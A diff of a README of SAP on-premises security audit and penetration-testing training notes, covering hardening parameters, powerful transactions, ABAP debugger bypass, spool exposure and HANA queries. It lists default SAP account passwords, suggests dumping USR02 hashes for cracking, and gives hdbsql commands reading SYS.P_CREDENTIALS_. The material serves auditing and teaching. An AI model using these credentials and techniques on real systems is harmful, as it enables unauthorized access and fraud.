@@ -3,18 +3,22 @@
 Training course materials and research notes that I created to teach how to perform a technical security audit and penetration test of SAP (hosted on-premises).
 
 ### Table of contents
-- [0. Useful tools and resources](#0-Useful-tools-and-resources)
-- [1. SAP security controls and configuration hardening review](#01-SAP-security-controls-and-configuration-hardening-review)
-- [2. How to get unauthorized access to SAP tables and data using SAP transactions](#02-How-to-get-unauthorized-access-to-SAP-tables-and-data-using-SAP-transactions)
-- [3. How to get remote OS commands execution using SAP transactions](#03-How-to-get-remote-OS-commands-execution-using-SAP-transactions)
-- [4. Risks of having the ABAP Debugger enabled in production environment](#04-Risks-of-having-the-ABAP-Debugger-enabled-in-production-environment)
-- [5. Sensitive information disclosure from SAP Spool](#05-Sensitive-information-disclosure-from-SAP-Spool)
-- [6. Development kits and transactions](#06-Development-kits-and-transactions)
-- [7. SAP user and access management](#07-SAP-User-and-Access-Management)
-- [8. SAP Hana database security configuration review](#08-SAP-Hana-Database-security-configuration-review)
-- [9. SAP penetration testing using NMAP and the Metasploit framework](#09-SAP-penetration-testing-using-NMAP-and-the-Metasploit-framework)
+- [Intro - List of useful tools and resources](#Intro-List-of-useful-tools-and-resources)
+- Security Audit
+	- [1. SAP security controls and configuration hardening review](#1-SAP-security-controls-and-configuration-hardening-review)
+	- [2. SAP user and access management review](#2-SAP-User-and-Access-Management-Review)
+	- [3. Risks of having the ABAP Debugger enabled in production environment](#3-Risks-of-having-the-ABAP-Debugger-enabled-in-production-environment)
+   	- [4. Sensitive information disclosure from SAP Spool](#4-Sensitive-information-disclosure-from-SAP-Spool)
+   	- [5. Development kits and transactions](#5-Development-Kits-and-Transactions)
+   	- [6. SAP Hana database security configuration review](#6-SAP-Hana-Database-Security-Configuration-Review)
+ - Penetration Test
+	- [1. How to get unauthorized access to SAP tables and data using SAP transactions](#1-How-to-get-unauthorized-access-to-SAP-tables-and-data-using-SAP-transactions)
+	- [2. How to get remote OS commands execution using SAP transactions](#2-How-to-get-remote-OS-commands-execution-using-SAP-transactions)
+	- [3. Risks of having the ABAP Debugger enabled in production environment](#3-Bypassing-security-controls-with-the-ABAP-Debugger)
+	- [4. SAP penetration testing using NMAP and the Metasploit framework](#4-SAP-penetration-testing-using-NMAP-and-the-Metasploit-framework)
 
-### 0. Useful tools and resources
+----------------
+### Intro - List of useful tools and resources
 ```
 Useful tools for auditing SAP
 —————————————————————————————
@@ -60,11 +64,15 @@ Useful resources regarding SAP security
 ➤ Operating System Security Hardening Guide for SAP HANA for SUSE Linux Enterprise Server 
   - https://documentation.suse.com/sbp/sap-15/html/OS_Security_Hardening_Guide_for_SAP_HANA_SLES15/index.html
 ```
+--------
+
+## I - SAP Security Audit 
 
 --------
-### 01. SAP security controls and configuration hardening review
 
-<i/>SAP Security controls (CoBIT)</i>
+### 1. SAP security controls and configuration hardening review
+
+<i/>1.1 - SAP Security controls (CoBIT)</i>
 > Check that the following technical security controls are implemented.
 ```
 - The superuser "SAP*" is properly secured
@@ -90,69 +98,130 @@ Useful resources regarding SAP security
 - Remote access by software vendors is controlled adequately
 ```
 
-<i/> Review the security level of the SAP Architecture/Infrastructure</i>
-> Check that the technology infrastructure is configured to secure communications and operations in the SAP ERP environment.
+<i/> 1.2 - Review the security level of the SAP Architecture/Infrastructure</i>
+> Check that the IT infrastructure and network supporting the SAP ERP environment are properly configured to secure communications and operations.
 ```
-> Firewall
-> SNC - Secure Network Communications (ideally should be set to « Privacy Protection »)
-> Secure Store and Forward (SSF) mechanisms and digital signatures
-> Workstation security
-> Operating system (server) and database security
-> Citrix Gateway and environment (if used)
-> SAP Router configuration
+> Firewall rules are implemented to restrict network access to the SAP ERP environment (i.e., application layer, server layer, database layer, etc.)
+> Patching and hardening of:
+  + the servers (e.g., SUSE Linux) supporting the SAP ERP environment
+  + the databases (e.g., SAP Hana db, Oracle db) supporting the SAP ERP environment
+  + the laptops and/or Citrix portal used by SAP users to log into SAP GUI client (if used)
 > …
 ```
+<i/> 1.3 - Review the SAP network encryption settings - Secure Network Communications (SNC))</i>
+> SAP Secure Network Communications (SNC)
+```
+> SNC protects the data communication paths between the various client and server components of the SAP system that use the SAP protocols RFC or DIAG.
+> There are well-known cryptographic algorithms that have been implemented by the various security products, and with SNC, you can apply these algorithms to your data for increased protection.
+> With SNC, you receive application-level, end-to-end security. All communication that takes place between two SNC-protected components is secured (for example, between the SAP GUI for Windows and the application server).
+> There are three levels of security protection you can apply. They are:
+  + Authentication only
+  + Integrity protection
+  + Privacy protection
+```
+> To audit the SNC settings, collect and review the "RSPARAM" configuration file (Use the Tcode SA38 and then enter RSPARAM). The default settings are not 
+```
+Parameter name			     Description
+———————————————————————————————————————————————————————————————————————————————————————————
+* rdisp/max_snc_hold_time            Maximum hold time while priv SNC                                                
+* rdisp/snc_no_commit                SNC uses a non-commit send mode                                                 
+* rdisp/use_snc_refresh              Should we use the SNC refresh
+* snc/accept_insecure_cpic           Accept insecure CPIC-connections to SNC-enabled Server                          
+* snc/accept_insecure_gui            Accept insecure SAPGUI logins to SNC-enabled Server                             
+* snc/accept_insecure_r3int_rfc      Accept insecure internal RFCs on SNC-enabled Server                             
+* snc/accept_insecure_rfc            Accept insecure RFC-connections to SNC-enabled Server                           
+* snc/data_protection/max            Limit for data protection of Secure Network Comm.                               
+* snc/data_protection/min            Min. required data protection for incoming connections                          
+* snc/data_protection/use            Level of data protection for R/3 initiated connections                          
+* snc/enable                         Enable SNC-Module (Secure Network Communications)                               
+* snc/force_login_screen             Display login screen for each SNC-protected login                               
+* snc/gssapi_lib                     Filename for external GSS-API shared library                                    
+* snc/identity/as                    Name of application server for external Security Syst.                          
+* snc/log_unencrypted_rfc            Security Audit Logging for unencrypted RFC connections                          
+* snc/only_encrypted_gui             Enforce encrypted SAPGUI connections                                            
+* snc/only_encrypted_rfc             nforce encrypted RFC connections                                               
+* snc/permit_insecure_start          Permit to start insecure programs when SNC is enabled                           
+* snc/r3int_rfc_qop                  Quality of protection for internal RFCs with SNC                                
+* snc/r3int_rfc_secure               Use SNC for internal RFC-Communications                                         
+* spnego/construct_SNC_name          Construct SNC name for given Kerberos User Name                                 
 
-<i/> Check the security policy settings (password policy, network encryption, ..)</i>
+Other SNC parameters (example)
+------------------------------
+> ccl/credential_encryption_algorithm : AES256
+> ccl/pkix/profile/sap_root/issuer 			CN=SAPSUPPORT Root CA 
+> ccl/pkix/profile/sap_root/revocation_check      	No
+> ccl/pse_encryption_algorithm 				PBES2-AES256-SHA256
+> ccl/snc/client_accepted_signature_algorithms    	SHA256_DSA:PKCS_BT_01_SHA256_RSA:PKCS_BT_01_SHA512_RSA:PKCS_
+> ccl/snc/client_cipher_suites				HIGH
+> ccl/snc/client_protocol 				2010_1_1:2010_1_0
+> ccl/snc/server_accepted_signature_algorithms		SHA256_DSA:PKCS_BT_01_SHA256_RSA:PKCS_BT_01_SHA512_RSA:PKCS_
+> ccl/snc/server_cipher_suites 				HIGH
+> ccl/snc/server_protocol 				2010_1_1:2010_1_0 
+> ccl/snc/server_session_key_types			ECDSA_P256:ECDSA_P384:ECDSA_P521
+```
+
+<i/> 1.4 - Review the SAP security policy settings for logon and password </i>
 > Collect and review the "RSPARAM" configuration file (Use the Tcode SA38 and then enter RSPARAM)
 ```
-> Login / password_Expiration			- Frequency of forced password change (default = 0 = off)
-> Login / min_password				- Minimum password length (default = 3)
-> Login / fails_to_user_lock			- Number of invalid password attempts before user is locked (default = 12)
-> Login / failed_user_auto_unlock		- If user account is locked is it permanently locked until released by administrator
-						  or automatically unlocked at midnight (default = 1 = unlocked at midnight)
-> Rdisp / gui_auto_logout			- User is logged off of SAP after a period of inactivity (default = 7200 seconds = 2 hours)
-> Login / disable_multi_gui_login		- (default = 0 = multiple logons permitted)
+Parameters						Description
+————————————————————————————————————————————————————————————————————————————————————————————————
+* login/accept_sso2_ticket                        	Accept SSO tickets for this (component) system                                  
+* login/certificate_mapping_rulebased             	enable / disable rule-based X.509 certificate mapping                           
+* login/certificate_request_ca_url                	URL of the certificate authority (for certificate requests)                     
+* login/certificate_request_subject               	Template for the subject of a certificate request                               
+* login/create_sso2_ticket                        	Create SSO tickets on  this  system                                             
+* login/disable_cpic                              	Disable Incoming CPIC Communications                                            
+* login/disable_multi_gui_login                   	disable multiple sapgui logons (for same SAP account)                           
+* login/disable_password_logon                    	login/disable_password_logon                                                    
+* login/failed_user_auto_unlock                   	Enable automatic unlock off locked user at midnight                             
+* login/fails_to_session_end                      	Number of invalid login attempts until session end                              
+* login/fails_to_user_lock                        	Number of invalid login attempts until user lock                                
+* login/isolate_rfc_system_calls                  	isolate RFC system calls                                                        
+* login/logon_category_restriction                	Logon Restriction based on Logon Category                                       
+* login/min_password_diff                         	min. number of chars which differ between old and new password                  
+* login/min_password_digits                       	min. number of digits in passwords                                              
+* login/min_password_letters                      	min. number of letters in passwords                                             
+* login/min_password_lng                          	Minimum Password Length                                                         
+* login/min_password_lowercase                    	minimum number of lower-case characters in passwords                            
+* login/min_password_specials                     	min. number of special characters in passwords                                  
+* login/min_password_uppercase                    	minimum number of upper-case characters in passwords                            
+* login/multi_login_users                         	list of exceptional users: multiple logon allowed                               
+* login/no_automatic_user_sapstar                 	Control of the automatic login user SAP*                                        
+* login/password_change_for_SSO                   	Handling of password change enforcements in Single Sign-On situations           
+* login/password_change_waittime                  	Password change possible after # days (since last change)                       
+* login/password_charset                          	character set used for passwords                                                
+* login/password_compliance_to_current_policy     	current password needs to comply with current password policy                   
+* login/password_downwards_compatibility          	password downwards compatibility (8 / 40 characters, case-sensitivity)          
+* login/password_expiration_time                  	Dates until password must be changed                                            
+* login/password_hash_algorithm                   	encoding and hash algorithm used for new passwords                              
+* login/password_history_size                     	Number of records to be stored in the password history                          
+* login/password_logon_usergroup                  	users of this group can still logon with passwords                              
+* login/password_max_idle_initial                 	maximum #days a password (set by the admin) can be unused (idle)                
+* login/password_max_idle_productive              	maximum #days a password (set by the user) can be unused (idle)                 
+* login/password_max_new_valid                    	-                                                                                
+* login/password_max_reset_valid                  	-                                                                                
+* login/protocol_blocked_secsess_creation         	Protocol blocked security session creation                                      
+* login/server_logon_restriction                  	Server Logon Restriction                                                        
+* login/show_detailed_errors                      	show detailed login error messages                                              
+* login/system_client                             	System default client                                                           
+* login/ticket_expiration_time                    	login/ticket_expiration_time                                                    
+* login/ticket_only_by_https                      	generate ticket that will only be sent via https                                
+* login/ticket_only_to_host                       	ticket will only be sent back to creating host                                  
+* login/ticketcache_entries_max                   	maximim number of entries for the SAP Logon Ticket cache                        
+* login/ticketcache_off                           	switch off caching for the SAP Logon Ticket                                     
+* login/update_logon_timestamp                    	update frequency / accuracy of logon timestamp                                  
 
 NOTE: if multi-login is disabled some users can still be permitted multiple logins via the “login/multi_login_users” setting where user-ids
       can be listed which can be permitted to logon multiple times
-
-Parameters					Description
-————————————————————————————————————————————————————————————————————————————————————————————————
-* login/disable_multi_gui_login 		Disable multiple sapgui logons (for same SAP account)
-* login/disable_password_logon			Login/disable_password_logon
-* login/failed_user_auto_unlock			Enable automatic unlock off locked user at midnight
-* login/fails_to_session_end			Number of invalid login attempts until session end
-* login/fails_to_user_lock			Number of invalid login attempts until user lock
-* login/isolate_rfc_system_calls	
-* login/min_password_diff			Min. number of chars which differ between old and new password
-* login/min_password_digits			Min. number of digits in passwords
-* login/min_password_letters			Min. number of letters in passwords
-* login/min_password_lng			Minimum Password Length
-* login/min_password_lowercase			Minimum number of lower-case characters in passwords
-* login/min_password_specials			Min. number of special characters in passwords
-* login/min_password_uppercase			Minimum number of upper-case characters in passwords
-* login/multi_login_users			List of exceptional users: multiple logon allowed
-* login/no_automatic_user_sapstar		Control of the automatic login user SAP*
-* login/password_change_for_SSO			Handling of password change enforcements in Single Sign-On situations
-* login/password_change_waittime		Password change possible after # days (since last change)
-* login/password_charset			
-* login/password_compliance_to_current_policy
-* login/password_downwards_compatibility	Password downwards compatibility (8 / 40 characters, case-sensitivity)
-* login/password_expiration_time		Dates until password must be changed
-* login/password_history_size			Number of records to be stored in the password history
-* login/password_logon_usergroup		Users of this group can still logon with passwords
-* login/password_max_idle_initial		Maximum #days a password (set by the admin) can be unused (idle)
-* login/password_max_idle_productive		maximum #days a password (set by the user) can be unused (idle)
 ```
- 
+
 > Notes: 
 The administration of security policies can be performed via the transaction SECPOL, which is secured by two authorization objects: S_SECPOL is checked during the maintenance of the policies themselves, while S_SECPOL_A is used to define the values that may be assigned to the security policy attributes.
 Easy ways to see which users have security policies assigned to them:
 Option 1:  SUIM: “Users > by Complex Selection Criteria” or “Users > by Logon Date and Password Change”
 Option 2: Directly in table USR02 (field SECURITY_POLICY).
 
-<i/> Check that the SAP default passwords have been changed </i>
+<i/> 1.4 - Check that the SAP default passwords have been changed </i>
 > This can be done by testing manually the default logins and passwords or using a script.
 > This can also be done by dumping the USR02 table and performing password dictionary attack with tools like 'John the Ripper' (password cracking tool). 
 ```
@@ -173,9 +242,9 @@ Option 2: Directly in table USR02 (field SECURITY_POLICY).
   Very High 			IDEADM 				admin					Almost all IDES		clients Only in IDES systems
   Very High 			DDIC 				19920706 				000,001,… 		User has SAP_ALL
   High 				CTB_ADMIN 			sap123 					N.A. 			Java user
-  High 				EARLYWATCH 			SUPPORT 				066			Has rights to get password hash for SAP* from 																USR02 table and sometimes OS execution
+  High 				EARLYWATCH 			SUPPORT 				066			Has rights to get password hash for SAP* from USR02 table and sometimes OS execution
   Medium 			 TMSADM				PASSWORD / $1Pawd2&     		000, 			sometimes copied to others
-  Medium /Low 			SAPCPIC 			ADMIN 					000,001			Can be used for information retrieval and in 																some cases for vulnerabilities where only 																authentication is needed
+  Medium /Low 			SAPCPIC 			ADMIN 					000,001			Can be used for information retrieval and in some cases for vulnerabilities where only uthentication is needed
 																					
   RISK 				USER 				TYPE 				PASSWORD 				SOLMAN SATELLITE
   ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
@@ -202,7 +271,7 @@ Notes:
 + H = PWDSALTEDHASH  (iSSHA-1; Maximum pwd length=40, case sensitive)
 ```
 
-<i/> Standard Security Reports to run (RSUSR via AID, SA38, or SUIM) </i>
+<i/> 1.5 - Standard Security Reports to run (RSUSR via AID, SA38, or SUIM) </i>
 ```
 > RSUSR003 – Check passwords for SAP* and DDIC 
 > RSUSR006 – locked users / unsuccessful login attempts
@@ -210,7 +279,7 @@ Notes:
 > RSUSR002 - Can be used to determine who has access to powerful BASIS transactions such as the following
 ```
 
-<i/> Review the SAP Gateway Security Files (SECINFO and REGINFO)</i>
+<i/> 1.6 - Review the SAP Gateway Security Files (SECINFO and REGINFO)</i>
 ```
 > The "secinfo" security file is used to prevent unauthorized launching of external programs.
 > The file "reginfo" controls the registration of external programs in the gateway. 
@@ -241,7 +310,7 @@ P TP=cpict4							//Program cpict4 is allowed to be registered by any host.
 P TP=* USER=* HOST=internal					//Programs within the system are allowed to register.
 ```
 
-<i/> SAP logging strategies / Audit trails</i>
+<i/> 1.7 - Review the SAP logging strategies / Audit trails</i>
 ```
 Tracing a Transaction
 —————————————————————
@@ -256,7 +325,11 @@ LOGS in SAP (programme RDDPRCHK)
   et preuve de leur exploitation.
 ```
 
-<i/> Types of users in SAP </i>
+------------------
+
+### 2. SAP User and Access Management Review
+
+<i/> 2.1 - Types of users in SAP </i>
 > There are five types of users in SAP (useful link: https://www.stechies.com/type-of-users-in-sap/)
 ```
 Dialog users (A)
@@ -296,8 +369,240 @@ A reference user is used only to assign additional authorizations.
 To assign a reference user to a dialog user, specify it when maintaining the dialog user on the Roles tab page.
 ```
 
+<i/> 2.2 - Review who has access (and with which permissions) to the following list of powerful SAP transactions </i>
+```
+> DBxx  			– Database related transactions
+> SCC4, SCC5 			- Client administration
+> SE01, SE10 			- CTS / TMS commands
+> SE38 				– ABAP Editor  (display, edit, execute ABAP source code)
+> SA38				– Only allows ABAP source code execution
+> SE93				– Maintains transactions (ex. create or copy a TCODE)
+> SM01 				- Lock / unlock transactions
+> SM12				– Lock entries
+> SM30, SM31			– Table Maintenance (can be used to display and update table data)
+> SE11, SE12, SE13, SE14 	- Table structure maintenance
+> SE14				- The database utility is the interface between the ABAP Dictionary and the relational database underlying the R/3 System.
+				  It allows you to edit (create, delete and adjust to changes to their definition in the ABAP Dictionary) database objects
+				  derived from objects of the ABAP Dictionary.
+> SE15				– Data Dictionary
+> ST04				- Database performance monitor (allow to send SQL request to the database)
+> SM32				– Updates Table USR40 with invalid passwords
+> SM3 				– Displays and deletes processing job logs
+> SM36/SM37			– Schedule Background Job 
+> SM49				– Execute external operating system commands
+> SM52				– Execute operating system commands
+> SM59				– Maintain Remote Function Calls destination definitions
+> SM69				– Maintain external commands
+> SP01				- Administer print spools
+> PFCG				- Role Maintenance (PFCG) can be used to create role and user like SU01
+> SU01         	 		- Maintain users, Security Administration transactions (create/delete/lock/unlock user account, change password etc.)
+> SU02     			- Allocate authorizations to a profile. Maintain SAP Authorization Profiles.     
+				  The transaction code SU02 can be use to manually edit SAP profiles. 
+				  As notification from the initial screen, SAP has recommended to not use this transaction any longer
+				  for profile and user administration.
+> SU10				- User MAss Maintenance (ex. Lock and Unlock user account, Change the password of a user?)
+				- Delete/add a profile for all users
+> SU03n
+> SU03     			- Maintenance of Authorizations 
+> SU53     			- Evaluate Authorization Check
+> AL11				- Display all the SAP Directories and files stored on the underlying OS server 
+> Program/report "RPCIFU01" 	- Display OS files
+> Program/report "RPCIFU03" 	- Download OS files	
+> Program/report "RSBDCOS0" 	- Execute OS commands
+> CG3Z or GUI_upload and CG3Y or GUI_download  - Upload / download files to SAP systems (underlying OS server)
+> SXDA, SXDB			- Data Transfer Workbench 
+> SXDA_TOOLS    		- DX Workbench: tools  
+> SU56				- User Authorization Buffer
+> SM01				- Can be used to block specific transactions and to list all transactions
+> RSUDO 			- idem SUDO mais pour SAP
+> RSRT 				- Query monitor
+> SCMP 				- Table/View Comparaison
+> SQVI				- Table Quickviewer
+> SUIM				- select USER and then "specific transactions" to see the list of users having access to specifics transactions
+	
+> OS04				- Local System Configuration
+> OS05				- Remote System Configuration
+> OS06				- Local Operating System Activity
+> OS07				- Remote Operating System Activity
+
+> SM13				- Administrate Update Records
+> SM1				- Update Program Administration
+> SM20				- Security Audit Log Assessment
+> SM21				- Online System Log Analysis
+	
+> TU02				- Parameter changes
+	
+> SE06				- Set Up Transport Organizer
+> STMS				- Transport Management System
+> SCC4				- (customize it to ztcode) - Administrationdes mandants 
+```
+<i/> 2.3 - Focus on the SAP transactions that allow to display the tables containing the SAP password hashes </i>
+> Multiple SAP transactions can be used to display the table USR02 and/or the view VUSR02_PWD that contain the local password hashes.
+```
+> SAP Quick Viewer : SQVI 
+> SAP Standard query : SQ01 
+> ST04
+> SE16
+> SE16n
+> SCMP  (View / Table Comparison)
+> ...
+```
+<i/> 2.4 - Weak parameter transactions </i>
+```
+Parameter transactions execute an existing transaction delivering pre-defined screen input.
+To determine all unsafe parameter transactions for SE16, SM30… you need to search for PARAMs matching "/N<TCD>" (e.g. "/NSM30*") in the table TSTCP.
+=> The presence of "/*" indicates that the first screen is skipped and thus the view name cannot be overridden.
+=> The presence of "/N<TCD>" (e.g. "/NSM30*") indicates that the first screen is not skipped and thus the pre-filled view name can be overridden (leaving the choice of the actual view name up to the user).
+Sources:
+- https://www.daniel-berlin.de/security/sap-sec/table-authorizations/
+- https://www.daniel-berlin.de/security/sap-sec/weak-parameter-transactions-sap/
+```
+
+-------------------
+
+### 3. Risks of having the ABAP Debugger enabled in production environment
+
+> One of the major risks in SAP is its powerful debugging environment with the ability to stop each program and enter debugging mode while the program continues running (including the ability to change values at run time). 
+The debugger allows bypassing certain controls (like authorization checks) and changing the system return-code (SY-SUBRC) for authorizations checks from Failed (4) to Succeeded (0).
+This could allow a hacker to either change an account number while running a payment program or change a report selection value or change the password of SAP privileged account.
+
+
+<i/> SAP privilege escalation attack - Bypass security controls with the ABAP Debugger </i>
+```
++ If the ABAP Debugger is enabled in production, a malevolent person having read-only access to SAP tables with transactions such as SE16 or SE16n could bypass controls (authorizations checks) and modify data to perform a privilege escalation attack and/or a financial fraud. 
+   > How-to: 
+      https://sapbasissolutions.wordpress.com/2017/10/12/how-to-edit-sap-tables-without-coding-or-debugging/
+
++ If the ABAP Debugger is enabled in production, a malevolent person could bypass security controls to get unauthorized access to certain SAP transactions (goal: perform a privilege escalation attack or a financial fraud). 
+   > How-to: 
+      https://www.erpworkbench.com/sap-security/bypass/bypass-tcode.htm
+      https://blogs.sap.com/2013/09/06/abap-tip-and-trick-to-break-tcode-access-to-not-so-authorized-tcodes/
+```
+
+<i/> Defense tips & Recommendations </i>
+```
++ Remove debugging authorizations from all users while granting privileged access to users that really have to enter the debugging environment.
+
++ Define debugging as a sensitive authorization and receive an alert for when someone is granted such authorization.
+   > The S_DEVELOP authorization object controls access to the debugger. 
+   > You can locate the roles that contain the S_DEVELOP authorization object using the SUIM report "Roles by Authorisation Values".
+   > You can locate the Users which have the S_DEVELOP authorization object using the SUIM report "Users by Authorisation Values".
+
++ Monitor users and their activities in the debugging environment.
+   > If a user replace variables (with the debugging mode) it creates a system log message; check SM21 !
+
++ Eliminate authorization to change values in the debugger, and instead permit only display options.
+```
+
 ------------
-### 02. How to get unauthorized access to SAP tables and data using SAP transactions
+### 4. Sensitive Information Disclosure from SAP Spool
+
+> One of the overlooked backdoors for getting valuable and sensitive data is the SAP spool. When a user/job prints in SAP, the output is first collected in the SAP spool (called Spool Request) and only then sent to the physical printer. 
+Many times the spool request is not deleted from the spool (for a very long time), even after the content is printed. Clearly, this turns the SAP spool into an excellent source for hackers to find information about money transfer slips, monthly pay-slips, check printouts, purchase orders and more.
+Furthermore, most users have access to the SAP spool (directly via T-Code SP01 or indirectly via T-Code SM37), and most organizations enable unlimited access to the spool items, including the options to view, download and re-print the content.
+
+<i/> Defense tips & Recommendations </i>
+```
++ Inspect which users access SAP spool items, especially those that were not created by them.
++ Define sensitive spool items by criteria and alert when they are accessed.
+```
+
+--------------
+### 5. Development Kits and Transactions
+```
+SAP Developper/ABAP/Workbench
+—————————————————————————————
+> SE36 ABAP/4: Logical Databases
+> SE37 ABAP/4 Function Modules
+> SE38 ABAP/4 Program Development
+> SE80 ABAP/4 Development Workbench
+> SE81 SAP Application Hierarchy
+> SE82 Customer Application Hierarchy
+> SE84 ABAP/4 Repository Information System
+> SE86 ABAP/4 Repository Information System 
+```
+```
+kit de développement RFC
+—————————————————————————
+Le kit de développement RFC permet de créer / modifier / supprimer une interface de type RFC (Remote Function Call). 
+Il est installé en standard par SAP.
+La gestion des liaisons RFC est réservée à un groupe restreint d’administrateurs clairement identifiés. La liste est tenue à jour.
+> suppression du kit de développement RFC (SDK « RFCSDK ») sur l’environnement de production.
+```
+```
+Remove developer keys from productive systems
+—————————————————————————————————————————————
+Many auditors check on productive SAP systems if any developer keys exist (in table DEVACCESS). 
+If there are any, this might become a finding that can easily avoid (… although the system is properly protected against changes in SCC4 and SE03).
+```
+
+-------------------
+
+### 6. SAP Hana Database Security Configuration Review
+
+<i/> 6.1 - List of useful SQL queries to extract the database configuration (e.g. list of users, roles, privileges, password policy, logs) </i>
+```
+'SELECT * FROM SYS.USERS LIMIT 500'
+'SELECT * FROM SYS.USERS_PARAMETERS LIMIT 500'
+'SELECT * FROM SYS.M_PASSWORD_POLICY'
+'SELECT * FROM SYS.P_CREDENTIALS_'
+'SELECT * FROM SYS.M_SECURESTORE'
+'SELECT * FROM SYS.SCHEMAS LIMIT 500'
+'SELECT * FROM SYS.ROLES LIMIT 500'
+'SELECT * FROM SYS.PRIVILEGES’
+'SELECT * FROM SYS.PROCEDURES'
+'SELECT * FROM SYS.P_CREDENTIALS_' (not authorized)
+'SELECT * FROM SYS.TABLES LIMIT 500'
+'SELECT * FROM SYS.AUDIT_ACTIONS LIMIT 500'
+'SELECT * FROM SYS.M_CONNECTIONS'
+'SELECT * FROM SYS.M_DATABASE'
+'SELECT * FROM SYS.M_HOST_INFORMATION'
+'SELECT * FROM SYS.M_INIFILE_CONTENTS' 
+'SELECT * FROM usr02;'
+```
+
+<i/> 6.2 - How to log into the database to extract the configuration </i>
+```
+> [Option 1] The SAP HANA configuration can be collected using a “SAP Basis” account with the ‘ST04’ and ‘DBxx’ transactions
+
+> [Option 2] Use SAP HANA HDBSQL to execute SQL commands at OS level.
+
+	+ HDBSQL is a command line tool for executing commands on SAP HANA databases.
+          SAP HANA HDBSQL is also used to automate the HANA Database backups using cron scripts. 
+	+ Requirement: You want to access SQL prompt using HDBSQL at OS level. 
+	+ Prerequisites : You need password of <SID>ADM user and User with HANA database access, in our example we are connecting using SYSTEM.
+	+ Steps :
+	• Logon to HANA host with <SID>adm user.
+	• Once you are logged in as <SID>adm  you can directly execute the hdbsql command , or you can go to following path and execute the hdbsql command.  
+	• cd /hana/shared/<SID>/hdbclient 
+	• Now execute the command 
+	• hdbsql  -n localhost -i 00 -u SYSTEM -p Ina123  
+
+	Once you get the command , enter \s to get the system information you are connected to.
+	Exit HDBSQL by entering the command: exit or quit or \q
+
+	You can also log on with user credentials for the secure user store (hdbuserstore) with -U <user_key>. 
+	HDBSQL Examples :
+	---------------
+	> hdbsql  -n localhost -i 00 -u SYSTEM -p Ina123;
+	> hdbsql -S DEV -n localhost:30015 -u SYSTEM -p In123 ;
+	> hdbsql -n localhost -i 00 -u myuser -p myuserpassword "select * from sys.users";
+	> hdbsql -U myUserSecureStore "Select table_name, schema_name from m_tables" ;
+	> hdbsql -U SUPER "SELECT * FROM SYS.P_CREDENTIALS_" ;
+	> hdbsql -u SYSTEM -n HOSTNAME:34215 -s EEP -sslprovider commoncrypto -sslkeystore $SECUDIR/sapsrv.pse -ssltruststore $SECUDIR/sapsrv.pse "SELECT * FROM SYS.P_CREDENTIALS_" ; 
+
+	Note:
+	"A user administrator can exclude users from this password check with the following SQL statement: ALTER USER <user_name> DISABLE PASSWORD LIFETIME.
+	 However, this is recommended only for technical users only, not database users that correspond to real people.
+	 A user administrator can re-enable the password lifetime check for a user with the following SQL statement: ALTER USER <user_name> ENABLE PASSWORD LIFETIME"
+```
+------------
+
+## II - SAP Penetration testing 
+
+------------
+
+### 1. How to get unauthorized access to SAP tables and data using SAP transactions
 
 <i/>Access to tables that include sensitive data should be carefully granted and monitored, specifically to inspect who is allowed to see/edit the data and who actually sees/edits it; who is able to use the table in QuickViewer / Data Browser (...) and who actually did; in which views the table is being used and who viewed the data; and finally in which queries the table is used and who performed these queries.</i>
 ```
@@ -412,7 +717,7 @@ Tips for SAP passcode cracking
 ```
 
 ------------
-### 03. How to get remote OS commands execution using SAP transactions
+### 2. How to get remote OS commands execution using SAP transactions
 
 <i/>There are several SAP transactions that allow authorized users to execute OS commands on the Windows/Linux server(s) hosting a SAP application/instance and/or a SAP database.
 All the OS commands are executed by a local OS account « <SID>adm » which is used to manage the SAP software at the OS layer and which can log into the SAP database with high privileges.
@@ -522,240 +827,28 @@ Step 3: Finally use the AL11 transaction to check that the file has been deleted
 
 http://quelquepart.biz/article26/cure-de-rajeunissement-pour-al11
 ```
-------------
-### 04. Risks of having the ABAP Debugger enabled in production environment
 
-> One of the major risks in SAP is its powerful debugging environment with the ability to stop each program and enter debugging mode while the program continues running (including the ability to change values at run time). 
-The debugger allows bypassing certain controls (like authorization checks) and changing the system return-code (SY-SUBRC) for authorizations checks from Failed (4) to Succeeded (0).
-This could allow a hacker to either change an account number while running a payment program or change a report selection value or change the password of SAP privileged account.
+-------------------
 
+### 3. Bypassing security controls with the ABAP Debugger
 
 <i/> SAP privilege escalation attack - Bypass security controls with the ABAP Debugger </i>
 ```
-+ If the ABAP Debugger is enabled in production, a malevolent person having read-only access to SAP tables with transactions such as SE16 or SE16n could bypass controls (authorizations checks) and modify data to perform a privilege escalation attack and/or a financial fraud. 
++ If the ABAP Debugger is enabled in production, an attacker having read-only access to SAP tables with transactions such as SE16 or SE16n could bypass controls (authorizations checks) and modify data to perform a privilege escalation attack. 
    > How-to: 
       https://sapbasissolutions.wordpress.com/2017/10/12/how-to-edit-sap-tables-without-coding-or-debugging/
 
-+ If the ABAP Debugger is enabled in production, a malevolent person could bypass security controls to get unauthorized access to certain SAP transactions (goal: perform a privilege escalation attack or a financial fraud). 
++ If the ABAP Debugger is enabled in production, an attacker could bypass security controls to get unauthorized access to certain SAP transactions and perform a privilege escalation attack.
    > How-to: 
       https://www.erpworkbench.com/sap-security/bypass/bypass-tcode.htm
       https://blogs.sap.com/2013/09/06/abap-tip-and-trick-to-break-tcode-access-to-not-so-authorized-tcodes/
 ```
 
-<i/> Defense tips & Recommendations </i>
-```
-+ Remove debugging authorizations from all users while granting privileged access to users that really have to enter the debugging environment.
-
-+ Define debugging as a sensitive authorization and receive an alert for when someone is granted such authorization.
-   > The S_DEVELOP authorization object controls access to the debugger. 
-   > You can locate the roles that contain the S_DEVELOP authorization object using the SUIM report "Roles by Authorisation Values".
-   > You can locate the Users which have the S_DEVELOP authorization object using the SUIM report "Users by Authorisation Values".
-
-+ Monitor users and their activities in the debugging environment.
-   > If a user replace variables (with the debugging mode) it creates a system log message; check SM21 !
-
-+ Eliminate authorization to change values in the debugger, and instead permit only display options.
-```
-
-------------
-### 05. Sensitive information disclosure from SAP Spool
-
-> One of the overlooked backdoors for getting valuable and sensitive data is the SAP spool. When a user/job prints in SAP, the output is first collected in the SAP spool (called Spool Request) and only then sent to the physical printer. 
-Many times the spool request is not deleted from the spool (for a very long time), even after the content is printed. Clearly, this turns the SAP spool into an excellent source for hackers to find information about money transfer slips, monthly pay-slips, check printouts, purchase orders and more.
-Furthermore, most users have access to the SAP spool (directly via T-Code SP01 or indirectly via T-Code SM37), and most organizations enable unlimited access to the spool items, including the options to view, download and re-print the content.
-
-<i/> Defense tips & Recommendations </i>
